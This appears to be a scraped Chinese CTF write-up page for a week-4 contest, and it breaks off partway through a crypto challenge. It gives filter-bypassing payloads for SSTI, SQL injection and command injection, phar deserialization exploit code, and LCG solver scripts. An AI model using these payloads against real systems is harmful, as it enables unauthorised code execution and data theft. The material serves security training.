</span></span><span class=line><span class=cl>6C9A21F76DB25683F73BBAF7
</span></span><span class=line><span class=cl>9310F0315B8EFBFF4C4027E
</span></span><span class=line><span class=cl>79CB4E0F7ACD9FF7DB7D086
</span></span><span class=line><span class=cl>DD34FC6EC3848D87AC39A3C1
</span></span><span class=line><span class=cl>E8740B1215F85026B6738297
</span></span><span class=line><span class=cl>44391138449B160527902DAA
</span></span><span class=line><span class=cl>73139EC699779D2B1A270E1C
</span></span><span class=line><span class=cl>18A7593B31E4C439F6F494F3
</span></span><span class=line><span class=cl>7F2A2CB1BC1A91D1E487B785
</span></span><span class=line><span class=cl>9BF0AEF4E7A295D6E3AF00C0
</span></span><span class=line><span class=cl>E07B61CDFC0CB62765F84F3B
</span></span><span class=line><span class=cl>C201212C5948AD0BFDC28872
</span></span><span class=line><span class=cl>D3D3781656EA182FE597443A
</span></span><span class=line><span class=cl>D82FCB444931499D7ACFEA76
</span></span><span class=line><span class=cl>7D9B679C3C23F433ABCB4DC
</span></span><span class=line><span class=cl>C3B4034F72C8BB6F92AF90D0
</span></span><span class=line><span class=cl>CBB265E461B3D15225079BE1
</span></span><span class=line><span class=cl>855B1E5A44C71563DAF8DAEF
</span></span><span class=line><span class=cl>EA8A5AC9E06AC912CB7DA484
</span></span><span class=line><span class=cl>1D7F642F34B84E00A129D43F
</span></span><span class=line><span class=cl>B22229172ABD3F9DF889213C
</span></span><span class=line><span class=cl>E5279F4AD50FF79CFC75331D
</span></span><span class=line><span class=cl>A2D80D3E0B32E7A333A3A06B
</span></span><span class=line><span class=cl>29BCC3F5A20BE76B599789D3
</span></span><span class=line><span class=cl>2B7A7CCA6F70008FB2D1E26F
</span></span><span class=line><span class=cl>C2684E550A7645F3D7DC26D3
</span></span><span class=line><span class=cl>2A37DA00E44CC8E99F1DB99A
</span></span><span class=line><span class=cl>133F9C6776EDF30AD17B44B9
</span></span><span class=line><span class=cl>BC240AF44553E7645BC28801
</span></span><span class=line><span class=cl>6B0033EF362368FFF8A7F0A7
</span></span><span class=line><span class=cl>EA21AF9B8194190B4D825DC5
</span></span><span class=line><span class=cl>A0327954BE5FC6ACE1E8EC89
</span></span><span class=line><span class=cl>F9BF20E5E1A04CCDDBF7B49
</span></span><span class=line><span class=cl>AA0260550583A4C8E2565105
</span></span><span class=line><span class=cl>DCC2D49CC1E68BAE4004593D
</span></span><span class=line><span class=cl>60C004FFBA26B4CC770EDE00
</span></span><span class=line><span class=cl>E41EE69A0079AB92344ECA94
</span></span><span class=line><span class=cl>5C0A81C861CA2CACFD913991
</span></span><span class=line><span class=cl>A8B29FEC6539697F9A915758
</span></span><span class=line><span class=cl>ED69127FCC9D9DA4669E2486
</span></span><span class=line><span class=cl>127C13853172AC159D13139C
</span></span><span class=line><span class=cl>355BCF7E27EC6501B694AEC1
</span></span><span class=line><span class=cl>E97F42C2FF1C3EB6CA53E2A9
</span></span><span class=line><span class=cl>B0FBC6673A557721464A7ED7
</span></span><span class=line><span class=cl>27446969442C0E6D66C2BBCA
</span></span><span class=line><span class=cl>375C602E5E873F99D4545120
</span></span><span class=line><span class=cl>228147FF254B9B18EB5DBC41
</span></span><span class=line><span class=cl>57E7993836C7A82CA4FADD0C
</span></span><span class=line><span class=cl>F840CB3E58D4ED2AB683DA8C
</span></span><span class=line><span class=cl>BA455E8B4B04CE2ECFD70C
</span></span><span class=line><span class=cl>72B7911E33CD4AB530F7EF42
</span></span><span class=line><span class=cl>2F4D7A0B357DE3C2E50BAF61
</span></span><span class=line><span class=cl>EAFE5DDACA23759F647C70AE
</span></span><span class=line><span class=cl>6D1CF29D3DA1C64E5155355
</span></span><span class=line><span class=cl>E48956B2BBFE1490E8B457E1
</span></span><span class=line><span class=cl>F59CDE7940250F7F55578FDF
</span></span><span class=line><span class=cl>D56F6AFBE767568377CB78C8
</span></span><span class=line><span class=cl>A93CB6ED988F52D95CAFDC2
</span></span><span class=line><span class=cl>17F7A882F3D79DB6C1580833
</span></span><span class=line><span class=cl>61EF9040462B8EC6D2164B37
</span></span><span class=line><span class=cl>25D4CE95979D62D2B1490226
</span></span><span class=line><span class=cl>4B3CE2665FEE08F1C7177301
</span></span><span class=line><span class=cl>AE37CA82C0427C12B38D3915
</span></span><span class=line><span class=cl>15A02F8338CE65364268862F
</span></span><span class=line><span class=cl>349A85C9F2F42D5F116490A7
</span></span><span class=line><span class=cl>3D43FC40CF08B518B18C9EF
</span></span><span class=line><span class=cl>7415F4497FE5798BC9FF8E9C
</span></span><span class=line><span class=cl>149D6CD044BD1E31AC131B14
</span></span><span class=line><span class=cl>968B0DB358911949BD7FC9DE
</span></span><span class=line><span class=cl>C0C7AE5D699BB2AF3C948B04
</span></span><span class=line><span class=cl>A510F9BCB0B6829F9B5570B3
</span></span><span class=line><span class=cl>A944BDD8B681D3565318880A
</span></span><span class=line><span class=cl>1597EC780B3230BF5CC13091
</span></span><span class=line><span class=cl>878ADB963C8A612DA96DCE61
</span></span><span class=line><span class=cl>D7242D061F44DF4F8F7FA07F
</span></span><span class=line><span class=cl>2C2F79C9FB4CDF52A75874CA
</span></span><span class=line><span class=cl>E065579D8C4E33D94300856F
</span></span><span class=line><span class=cl>27078D10C1A84D5CC50B98FF
</span></span><span class=line><span class=cl>43F72CEF8A8CC0C4FE55AAA5
</span></span><span class=line><span class=cl>8C2A93BB42DA68A248ACE528
</span></span><span class=line><span class=cl>B3D26B4864461B382CCAB42F
</span></span><span class=line><span class=cl>8FA7F68F2C9D5D752CFD056B
</span></span><span class=line><span class=cl>38DE57BD44069F4C65A0F759
</span></span><span class=line><span class=cl>E868CAC78C3B046D96B65810
</span></span><span class=line><span class=cl>15365D1A8FCD04FA38923611
</span></span><span class=line><span class=cl>C6089ED8320210A0DC131E31
</span></span><span class=line><span class=cl>96C934B97457D41EB83B13BC
</span></span><span class=line><span class=cl>705893B39AE702F5B8CBE192
</span></span><span class=line><span class=cl>8BAD466BF8ADD4A717A53591
</span></span><span class=line><span class=cl>30847245D2D389A8C3D2DFDC
</span></span><span class=line><span class=cl>2F17527727F10B69C349288B
</span></span><span class=line><span class=cl>EC41BEB5BB6A55112FDD877D
</span></span><span class=line><span class=cl>32CDC148021A61C360A0F70F
</span></span><span class=line><span class=cl>DD3AA59AD26BB9D73419F24D
</span></span><span class=line><span class=cl>2F646BEC5576AED579523FDF
</span></span><span class=line><span class=cl>19869C25C1992EDFDBBDD337
</span></span><span class=line><span class=cl>A89E3A72326C0F71B317A8D8
</span></span><span class=line><span class=cl>10F54260B4F22234D1B8B97D
</span></span><span class=line><span class=cl>ABDD148461B707F2389EC44B
</span></span><span class=line><span class=cl>E5AFE6201B053FFE79C2940B
</span></span><span class=line><span class=cl>C842D80F1F5E567F59A3FFB5
</span></span><span class=line><span class=cl>C0951ED3354432B2E37824D6
</span></span><span class=line><span class=cl>6C98F42E23BE6AB18BEA0FD1
</span></span><span class=line><span class=cl>B5D1FB2D95C8F7839841E6E6
</span></span><span class=line><span class=cl>AD92F8AA9FF85807339ABB3A
</span></span><span class=line><span class=cl>CF826F03EB56676F1B07C81
</span></span><span class=line><span class=cl>942E90513D2012F5B774EF6B
</span></span><span class=line><span class=cl>CA32692897279C9ECDF5792C
</span></span><span class=line><span class=cl>5EAC3107FC150568B337DB18
</span></span><span class=line><span class=cl>66A6EF545E2FA71560D63D22
</span></span><span class=line><span class=cl>E731EBC3231CEBF125EDA48
</span></span><span class=line><span class=cl>61FF522C670D57B545383DAD
</span></span><span class=line><span class=cl>DD53CECBFC294E5A83E4C836
</span></span><span class=line><span class=cl>84250AB8CB2F9E9A93DF3FBC
</span></span><span class=line><span class=cl>5107809CCD43339EE867C9F
</span></span><span class=line><span class=cl>113C3096B03D414F544C46F
</span></span><span class=line><span class=cl>DAAC47BDB55931D9320BA4C6
</span></span><span class=line><span class=cl>41612C482C2E6D8D643082F3
</span></span><span class=line><span class=cl>6B767FFA2CB1977CB8EDB327
</span></span><span class=line><span class=cl>ADAB0E1357C19FB9186B5C4
</span></span><span class=line><span class=cl>F2C74D8B17FD0C191C738D11
</span></span><span class=line><span class=cl>4EEAB90478B07F197C7EADEB
</span></span><span class=line><span class=cl>D507CDD704CFB5AE5D7F83A
</span></span><span class=line><span class=cl>9B7D458A5B45C758DB270AEB
</span></span><span class=line><span class=cl>DFA69A057FCE26057F8D3972
</span></span><span class=line><span class=cl>1971A864B6D16478A230E6A5
</span></span><span class=line><span class=cl>560225678FB69D6DA9E3BDC
</span></span><span class=line><span class=cl>AA9D9F037BA31330752533CD
</span></span><span class=line><span class=cl>5B03D87645AE218FC67502B5
</span></span><span class=line><span class=cl>CE129307F83FD7209E2E1A8D
</span></span><span class=line><span class=cl>A1D0F2DCFD03CF0B2F217406
</span></span><span class=line><span class=cl>5509E5D8DD567EDC4513D6BC
</span></span><span class=line><span class=cl>5B0DCEB25E579FAE775363C
</span></span><span class=line><span class=cl>EE114AADA3E0305EAEE107F5
</span></span><span class=line><span class=cl>3301F325424937AFA66FBD3A
</span></span><span class=line><span class=cl>E673C6021354F8BC87C7AF39
</span></span><span class=line><span class=cl>A67EFB04F1DEFAFAE036221C
</span></span><span class=line><span class=cl>6CA419AE1B79AC2959B02704
</span></span><span class=line><span class=cl>80A36CD9EBCB35EE32772FDA
</span></span><span class=line><span class=cl>FA41A5A21E55E625B56BB87
</span></span><span class=line><span class=cl>A319658EFAC209578D117742
</span></span><span class=line><span class=cl>F2C507A67D36015663FEE0B7
</span></span><span class=line><span class=cl>EA7227E2E058B06FCD04457F
</span></span><span class=line><span class=cl>D3E6594933BE39D4DFFF2AC8
</span></span><span class=line><span class=cl>831F47DCFF677CBA7F0C0267
</span></span><span class=line><span class=cl>BAE9DCC831E6F13D1599AE06
</span></span><span class=line><span class=cl>16C56F3326C86C3BE2202A2E
</span></span><span class=line><span class=cl>23E00B292AC3200B5FDD935F
</span></span><span class=line><span class=cl>2E551FD1EF8DFA06658E668B
</span></span><span class=line><span class=cl>2D6F94F9DFD948C8B12DA9C
</span></span><span class=line><span class=cl>41A575D3C890A9BBBD9E27EF
</span></span><span class=line><span class=cl>41341CCC57226AF49EC8013D
</span></span><span class=line><span class=cl>6F7BD48B5BAE0741C4C0E0D8
</span></span><span class=line><span class=cl>6CC1D69AB830977BC4B5F70A
</span></span><span class=line><span class=cl>9A511A92165E0732981B635B
</span></span><span class=line><span class=cl>9A912F92F8913E5D8B06807C
</span></span><span class=line><span class=cl>C4BA446FD25AD04E55AAB4DD
</span></span><span class=line><span class=cl>6198B81E1E655BA04029A89A
</span></span><span class=line><span class=cl>674CC4A6BB3BA79E9FC1C487
</span></span><span class=line><span class=cl>96E0837517EF4F5028A9BEB
</span></span><span class=line><span class=cl>47D7117E4DCF7D91AFCBB066
</span></span><span class=line><span class=cl>553E973EAB95100493ECB40F
</span></span><span class=line><span class=cl>86CD5DE1EA2713CC7518926D
</span></span><span class=line><span class=cl>CF53838182A0C1417EEF42A1
</span></span><span class=line><span class=cl>3DEF2FD31AE237D8EB777D97
</span></span><span class=line><span class=cl>8691C68FD6296AE4696C28A0
</span></span><span class=line><span class=cl>B75B38E32EF8B715B000FECA
</span></span><span class=line><span class=cl>D249F21DEAA67F70F056F7B9
</span></span><span class=line><span class=cl>9A2B0CE4B56E2C13EA29BF08
</span></span><span class=line><span class=cl>7ECCD34CBEAEF5092BF5D87D
</span></span><span class=line><span class=cl>9A261DB09F35AB22A4EA389D
</span></span><span class=line><span class=cl>FA88892E319461D776BC4D1E
</span></span><span class=line><span class=cl>7A8F0FAA846C4515B66EB3D4
</span></span><span class=line><span class=cl>90EC692A57500A86AE18ACA2
</span></span><span class=line><span class=cl>CA7D279C9951662C978F74A0
</span></span><span class=line><span class=cl>58E0F87E25976D38E233B273
</span></span><span class=line><span class=cl>72F92BD9BF4ABDF8B7F18683
</span></span><span class=line><span class=cl>292F33FEF6CDD86163ED61D0
</span></span><span class=line><span class=cl>35DB3CFBFFC22D1B240BB750
</span></span><span class=line><span class=cl>3406D59EFDDAB954AA86FBD9
</span></span><span class=line><span class=cl>AF55EEDCF981EC0CC240EA96
</span></span><span class=line><span class=cl>A0C21F1804B951C6A2752930
</span></span><span class=line><span class=cl>4D1DEE214E8D81A1230C5AA5
</span></span><span class=line><span class=cl>C2D4FC3F46879D5AAE6B3887
</span></span><span class=line><span class=cl>FAD396A595FBFB489499FC42
</span></span><span class=line><span class=cl>F73EC81BA7D1FEE0EA5369E9
</span></span><span class=line><span class=cl>2D1AAE10210F9D9C0C998C6
</span></span><span class=line><span class=cl>F4A6FAC24113EBEDCA3F055F
</span></span><span class=line><span class=cl>C49D2222D5057C0A606ECDC1
</span></span><span class=line><span class=cl>74A9BB9A89BA59A09781F919
</span></span><span class=line><span class=cl>52D552965DEDE0A8479DEB72
</span></span><span class=line><span class=cl>53C63D45D42F8811A2AA1B44
</span></span><span class=line><span class=cl>40FCA767CDC5598693A4E95A
</span></span><span class=line><span class=cl>1780A3E647475554BC9C3CA5
</span></span><span class=line><span class=cl>F5E680B9883EA2F319971107
</span></span><span class=line><span class=cl>7F75FAC583369549DAB2DE
</span></span><span class=line><span class=cl>1A70A2A540CC6571F0888272
</span></span><span class=line><span class=cl>752EE6D93A37BF26791ED065
</span></span><span class=line><span class=cl>77D41F8F2B975700CF4C7A
</span></span><span class=line><span class=cl>DD1B9D1D82F9C82A7BDC11A1
</span></span><span class=line><span class=cl>870BAAED444E72CBE7FB4BCC
</span></span><span class=line><span class=cl>9BDB7AFF15F4C8DFC785999F
</span></span></code></pre></div><h2 id=week4>week4</h2><h3 id=web-2>web</h3><h4 id=babyssti_two>BabySSTI_Two</h4><p><a href=https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/ target=_blank rel="noopener noreffer">SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)</a></p><p>[]绕过“和关键字；hex编码或Unicode绕过</p><p>payload：</p><pre tabindex=0><code>?name={{&#39;&#39;[&#39;__cla&#39;&#39;ss__&#39;][&#39;__ba&#39;&#39;ses__&#39;][0][&#39;__subcl&#39;&#39;asses__&#39;]()[117][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;po&#39;&#39;pen&#39;](&#39;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64&#39;)[&#39;re&#39;&#39;ad&#39;]()}}
</code></pre><h4 id=又一个sql>又一个SQL</h4><p>绕过空格：%0c</p><p>前面数字不能直接引号闭合，直接写个没有数据的数字（没遇到</p><p>payload：</p><pre tabindex=0><code>name=122%0cunion%0cselect%0ctext,id%0cfrom%0cwfy_comments%0cwhere%0cid=100
</code></pre><p>（数据库没换过，可以直接看前几周的</p><h4 id=so-baby-rce>So Baby RCE</h4><p>绕过关键词：<code>${11}</code></p><p>绕过空格：<code>%09</code></p><p>绕过分号：<code>%0a</code></p><p>绕过文件名fl：shell特殊变量 <code>$@</code></p><p>payload：</p><pre tabindex=0><code>cmd=cd%09..%0acd%09..%0acd%09..%0aca${11}t%09ffff$@llllaaaaggggg
</code></pre><h4 id=unserializethree>UnserializeThree</h4><p>检测，发现class.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Evil</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/&gt;|&lt;|\?|php|&#34;</span><span class=o>.</span><span class=nx>urldecode</span><span class=p>(</span><span class=s2>&#34;%0a&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;/i&#34;</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=c1>//Same point ,can you bypass me again?
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>eval</span><span class=p>(</span><span class=s2>&#34;#&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;No!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
</span></span></code></pre></div><p>文件上传+反序列化  一般为phar</p><p>参考：<a href=https://cloud.tencent.com/developer/article/1740438 target=_blank rel="noopener noreffer">反序列化之Phar流 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>上传phar文件，利用伪协议读取，触发反序列化</p><p>生成phar</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Evil</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r</span><span class=s2>ls /&#34;</span><span class=p>;</span>  <span class=c1># /r绕过#
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Evil</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;E:/test.phar&#34;</span><span class=p>);</span> <span class=c1>//生成的phar文件，调用后缀名必须为phar
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s1>&#39;GIF89a&#39;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span> <span class=c1>//设置stub			
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span> <span class=c1>//将自定义的meta-data存入manifest
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span> <span class=c1>//添加要压缩的文件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//签名自动计算
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>上传phar文件，更改文件类型绕过，得到文件路径</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>class</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>file</span><span class=o>=</span><span class=nx>phar</span><span class=o>://</span><span class=nx>文件路径</span>
</span></span></code></pre></div><p>之后更改$cmd重新上传就能得到flag</p><p>phar报错：将php.ini中的 <code>;phar.readonly = On</code> 改为 <code>phar.readonly = Off</code></p><h4 id=rome>！！！Rome</h4><p>java反序列化 ROME链</p><p>工具：ysoserial <a href=https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#toc-head-3 target=_blank rel="noopener noreffer">ysoserial使用方法 – cc (ccship.cn)</a></p><p>反编译<a href=https://github.com/java-decompiler/jd-gui/releases/tag/v1.6.6 target=_blank rel="noopener noreffer">Release JD-GUI 1.6.6 · java-decompiler/jd-gui (github.com)</a></p><h3 id=crypto-2>crypto</h3><h4 id=lcg-revenge>LCG Revenge</h4><p>线性同余式</p><p><a href=https://xie-yuanhao.gitee.io/2022/01/10/Crypto-LCG%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99/#%E4%BB%80%E4%B9%88%E6%98%AF-LCG target=_blank rel="noopener noreffer">Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io)</a></p><p>x(n+1) = (a * x(n)+c) (mod m)</p><p>t * a=1 (mod m),  x(n) = t * (x(n+1)-c) (mod m)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>FLAG</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>step</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>FLAG</span><span class=p>)</span> <span class=o>//</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>xs</span> <span class=o>=</span> <span class=p>[</span><span class=n>bytes_to_long</span><span class=p>(</span><span class=n>FLAG</span><span class=p>[:</span><span class=n>step</span><span class=p>]),</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>FLAG</span><span class=p>[</span><span class=n>step</span><span class=p>:</span><span class=mi>2</span><span class=o>*</span><span class=n>step</span><span class=p>]),</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>FLAG</span><span class=p>[</span><span class=mi>2</span><span class=o>*</span><span class=n>step</span><span class=p>:])]</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>18038175596386287827</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mi>15503291946093443851</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>17270168560153510007</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>307956849617421078439840909609638388517</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>new_state</span> <span class=o>=</span> <span class=p>(</span><span class=n>a</span><span class=o>*</span><span class=n>xs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>b</span><span class=o>*</span><span class=n>xs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>c</span><span class=o>*</span><span class=n>xs</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>    <span class=n>xs</span> <span class=o>=</span> <span class=n>xs</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span> <span class=o>+</span> <span class=p>[</span><span class=n>new_state</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1>#print(xs)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>xs</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span>
</span></span></code></pre></div><p>exp：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>Crypto</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xs</span> <span class=o>=</span> <span class=p>[</span><span class=mi>255290883651191064919890629542861653873</span><span class=p>,</span> <span class=mi>221128501895959214555166046983862519384</span><span class=p>,</span> <span class=mi>108104020183858879999084358722168548984</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mi>18038175596386287827</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mi>15503291946093443851</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>17270168560153510007</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>307956849617421078439840909609638388517</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>new</span> <span class=o>=</span> <span class=p>(</span><span class=n>t</span><span class=o>*</span><span class=p>(</span><span class=n>xs</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>b</span><span class=o>*</span><span class=n>xs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>c</span><span class=o>*</span><span class=n>xs</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span><span class=o>%</span><span class=n>p</span>
</span></span><span class=line><span class=cl>    <span class=n>xs</span> <span class=o>=</span> <span class=p>[</span><span class=n>new</span><span class=p>]</span> <span class=o>+</span> <span class=n>xs</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>xs</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span> <span class=o>+</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>xs</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span> <span class=o>+</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>xs</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=代数关系>代数关系</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>getStrongPrime</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>getStrongPrime</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span>
</span></span><span class=line><span class=cl><span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d1</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e1</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
